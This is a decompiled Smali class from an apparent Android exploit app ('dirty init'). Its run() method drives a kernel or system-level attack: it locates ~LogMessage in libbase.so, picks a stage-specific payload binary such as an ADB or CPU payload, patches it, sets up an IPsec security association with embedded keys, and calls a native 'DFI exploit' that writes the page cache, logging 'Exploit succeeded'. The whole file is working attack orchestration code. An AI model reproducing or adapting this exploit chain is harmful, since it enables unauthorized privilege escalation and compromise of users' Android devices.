.class Lcom/dirty/init/DirtyInitActivity$7;
.super Ljava/lang/Object;
.source "DirtyInitActivity.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/dirty/init/DirtyInitActivity;->runDfiExploit()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/dirty/init/DirtyInitActivity;


# direct methods
.method constructor <init>(Lcom/dirty/init/DirtyInitActivity;)V
    .locals 0
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x8010
        }
        names = {
            null
        }
    .end annotation

    .line 477
    iput-object p1, p0, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 19

    move-object/from16 v1, p0

    const-string v0, "\nTotal time: "

    const-string v2, "    SA ready: SPI=0x"

    const-string v3, "ERROR: Payload asset \'"

    const-string v4, "ERROR: ~LogMessage too small for any payload ("

    const-string v5, "EXCEPTION: "

    .line 480
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    const v8, -0x9495

    .line 483
    :try_start_0
    iget-object v9, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const-string v10, "Parsing target ELF..."

    const/16 v11, -0x5600

    invoke-static {v9, v10, v11}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$msetStatus(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;I)V

    .line 484
    iget-object v9, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const-string v10, "[1] Locating ~LogMessage in libbase.so via ELF .dynsym"

    invoke-static {v9, v10}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mappendLog(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)V

    .line 492
    iget-object v9, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v9}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mgetLogMessageSize(Lcom/dirty/init/DirtyInitActivity;)I

    move-result v9

    if-gez v9, :cond_0

    .line 495
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const-string v2, "ERROR: Could not determine ~LogMessage size."

    invoke-static {v0, v2}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mappendLog(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)V

    .line 496
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const-string v2, "readelf failed or symbol not found in libbase.so."

    invoke-static {v0, v2}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mappendLog(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)V

    .line 497
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const-string v2, "readelf failed"

    invoke-static {v0, v2, v8}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$msetStatus(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;I)V

    .line 498
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v0}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$menableExecButton(Lcom/dirty/init/DirtyInitActivity;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 559
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v0}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mteardownSA(Lcom/dirty/init/DirtyInitActivity;)V

    return-void

    :cond_0
    const/16 v10, 0x1f4

    if-ge v9, v10, :cond_1

    .line 501
    :try_start_1
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " bytes, need \u2265500)"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mappendLog(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)V

    .line 503
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const-string v2, "This device\'s libbase.so cannot host the relay."

    invoke-static {v0, v2}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mappendLog(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)V

    .line 504
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const-string v2, "Incompatible target"

    invoke-static {v0, v2, v8}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$msetStatus(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;I)V

    .line 505
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v0}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$menableExecButton(Lcom/dirty/init/DirtyInitActivity;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 559
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v0}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mteardownSA(Lcom/dirty/init/DirtyInitActivity;)V

    return-void

    :cond_1
    const/16 v4, 0x240

    .line 507
    const-string v10, "    ~LogMessage: "

    if-ge v9, v4, :cond_2

    .line 508
    :try_start_2
    const-string v4, "payload_500.bin"

    .line 509
    iget-object v12, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, " bytes \u2192 using 500-byte single-client payload"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v12, v9}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mappendLog(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)V

    goto :goto_0

    .line 512
    :cond_2
    const-string v4, "payload_576.bin"

    .line 513
    iget-object v12, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, " bytes \u2192 using 576-byte multi-connection payload"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v12, v9}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mappendLog(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)V

    .line 517
    :goto_0

    iget-object v12, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    iget v12, v12, Lcom/dirty/init/DirtyInitActivity;->stage:I

    const/16 v9, 0x10

    if-ne v12, v9, :st_thoff

    const-string v4, "payload_adb.bin"

    goto :pick_done

    :st_thoff
    const/16 v9, 0x11

    if-ne v12, v9, :st_thon

    const-string v4, "payload_thoff.bin"

    goto :pick_done

    :st_thon
    const/16 v9, 0x12

    if-ne v12, v9, :st_cpu

    const-string v4, "payload_thon.bin"

    goto :pick_done

    :st_cpu
    const/16 v9, 0x20

    if-ne v12, v9, :st_relay

    const-string v4, "payload_cpu_tpl.bin"

    goto :pick_done

    :st_relay
    if-eqz v12, :legacy1

    const-string v4, "payload_bt.bin"

    goto :pick_done

    :legacy1
    const/4 v9, 0x1

    if-ne v12, v9, :pick_relay

    const-string v4, "payload_cpu.bin"

    goto :pick_done

    :pick_relay
    const-string v4, "payload_576.bin"

    :pick_done
    iget-object v9, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v9, v4}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mloadAsset(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)[B

    move-result-object v15

    if-nez v15, :cond_3

    .line 519
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\' not found"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mappendLog(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)V

    .line 520
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const-string v2, "Failed"

    invoke-static {v0, v2, v8}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$msetStatus(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;I)V

    .line 521
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v0}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$menableExecButton(Lcom/dirty/init/DirtyInitActivity;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 559
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v0}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mteardownSA(Lcom/dirty/init/DirtyInitActivity;)V

    return-void

    .line 525
    :cond_3
    move-object/from16 v12, v15

    iget-object v3, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    iget v13, v3, Lcom/dirty/init/DirtyInitActivity;->stage:I

    iget-object v14, v3, Lcom/dirty/init/DirtyInitActivity;->cpuVals:[I

    iget v4, v3, Lcom/dirty/init/DirtyInitActivity;->markerSeq:I

    move/from16 v15, v4

    invoke-static {v12, v13, v14, v15}, Lcom/dirty/init/PayloadPatcher;->patch([BI[II)[B

    move-result-object v15
    :try_start_3
    iget-object v3, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const-string v4, "    Setting up IPsec Security Association..."

    invoke-static {v3, v4}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mappendLog(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)V

    .line 526
    iget-object v3, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v3}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$msetupSA(Lcom/dirty/init/DirtyInitActivity;)V

    .line 527
    iget-object v3, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v3}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$fgetactiveSpi(Lcom/dirty/init/DirtyInitActivity;)I

    move-result v4

    invoke-static {v4}, Ljava/lang/Integer;->toHexString(I)Ljava/lang/String;

    move-result-object v4

    iget-object v9, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v9}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$fgetactiveEncapPort(Lcom/dirty/init/DirtyInitActivity;)I

    move-result v9

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v4, " port="

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v3, v2}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mappendLog(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)V

    .line 530
    iget-object v2, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const-string v3, "Writing page cache..."

    invoke-static {v2, v3, v11}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$msetStatus(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;I)V

    const/16 v2, 0x40

    .line 534
    new-array v2, v2, [B

    .line 535
    invoke-static {}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$sfgetAES_CBC_KEY()[B

    move-result-object v3

    const/16 v4, 0x20

    const/4 v9, 0x0

    invoke-static {v3, v9, v2, v9, v4}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 536
    invoke-static {}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$sfgetHMAC_SHA256_KEY()[B

    move-result-object v3

    invoke-static {v3, v9, v2, v4, v4}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 538
    iget-object v12, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v12}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$fgetactiveEncapPort(Lcom/dirty/init/DirtyInitActivity;)I

    move-result v13

    iget-object v3, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v3}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$fgetactiveSpi(Lcom/dirty/init/DirtyInitActivity;)I

    move-result v14

    iget-object v3, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const/16 v17, 0x10

    move-object/from16 v16, v2

    move-object/from16 v18, v3

    invoke-static/range {v12 .. v18}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mnativeDfiExploit(Lcom/dirty/init/DirtyInitActivity;II[B[BILjava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    .line 542
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    sub-long/2addr v3, v6

    .line 543
    iget-object v6, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const-wide/16 v9, 0x3e8

    div-long v9, v3, v9

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, "ms ("

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v9, v10}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, "s)"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v6, v0}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mappendLog(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)V

    if-eqz v2, :cond_4

    .line 546
    const-string v0, "SUCCESS"

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 547
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const-string v2, "Exploit succeeded"

    const v3, -0xff198a

    invoke-static {v0, v2, v3}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$msetStatus(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;I)V

    goto :goto_1

    :cond_4
    if-eqz v2, :cond_5

    .line 548
    const-string v0, "Integrity check"

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_5

    .line 549
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const-string v2, "Complete (verify output)"

    invoke-static {v0, v2, v11}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$msetStatus(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;I)V

    goto :goto_1

    .line 551
    :cond_5
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const-string v2, "Check output"

    invoke-static {v0, v2, v11}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$msetStatus(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;I)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_1

    :catchall_0
    move-exception v0

    goto :goto_2

    :catch_0
    move-exception v0

    .line 554
    :try_start_4
    iget-object v2, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v3

    .line 555
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, ": "

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 554
    invoke-static {v2, v3}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mappendLog(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)V

    .line 556
    const-string v2, "DIRTY_INIT"

    const-string v3, "Exploit failed"

    invoke-static {v2, v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 557
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    const-string v2, "Exception"

    invoke-static {v0, v2, v8}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$msetStatus(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;I)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 559
    :goto_1
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v0}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mteardownSA(Lcom/dirty/init/DirtyInitActivity;)V

    .line 562
    iget-object v0, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v0}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$menableExecButton(Lcom/dirty/init/DirtyInitActivity;)V

    return-void

    .line 559
    :goto_2
    iget-object v2, v1, Lcom/dirty/init/DirtyInitActivity$7;->this$0:Lcom/dirty/init/DirtyInitActivity;

    invoke-static {v2}, Lcom/dirty/init/DirtyInitActivity;->-$$Nest$mteardownSA(Lcom/dirty/init/DirtyInitActivity;)V

    .line 560
    throw v0
.end method
